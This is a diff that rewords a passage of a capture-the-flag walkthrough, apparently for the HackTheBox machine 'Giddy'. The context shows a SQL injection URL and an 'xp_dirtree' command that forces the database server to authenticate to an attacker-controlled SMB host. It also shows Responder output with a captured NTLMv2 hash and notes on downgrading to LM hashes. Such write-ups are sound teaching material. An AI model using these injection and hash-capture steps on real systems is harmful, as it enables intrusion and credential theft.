@@ -96,7 +96,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 In the `/remote` directory we have a login to connect to a Powershell session (Handy if we get valid credentials) and in the `/mvc` directory we can see what looks like a shop or something like that.
 
-The shop allows to check the producs per category using an URL parameter. This parameter (Called `ProductSubCategoryId`) is SQL injectable:
+The shop allows to check the producs per category using an URL parameter. This parameter, called `ProductSubCategoryId`, is SQL injectable:
 
 ```
 http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 or 1=1
@@ -114,7 +114,7 @@ Using SQLMap I can easily get a DB shell and execute this command:
 sql-shell> exec master.dbo.xp_dirtree '\\10.10.14.43\anything';
 ```
 
-What the above command does is connect to a SMB server that I control. Using Responder we can capture the NTLM hash that the SQL Server is gonna use to authenticate to it:
+What the above command does is connect to a SMB server that I control. Using Responder it is possible to capture the NTLM hash that the SQL Server is gonna use to authenticate to the SMB server:
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
@@ -131,7 +131,7 @@ What the above command does is connect to a SMB server that I control. Using Res
 [SMB] NTLMv2 Hash     : Stacy::GIDDY:eb026b7aa03a8007:81BFACFB06B08C65ED16CD768B550BA9:0101000000000000D69B920A132CD8016B32F9AF32F3F4FF00000000020000000000000000000000
 ```
 
-Notice the last Responder parameter I used, that will make clients use a LM hash intead of NTLM if possible. Since LM hashes are easier to crack using that parameter ease the next step.
+Notice the last Responder parameter I used, that will make clients use a LM hash intead of NTLM if possible. Since LM hashes are easier to crack using that parameter ease the next steps.
 
 ## Foothold
 
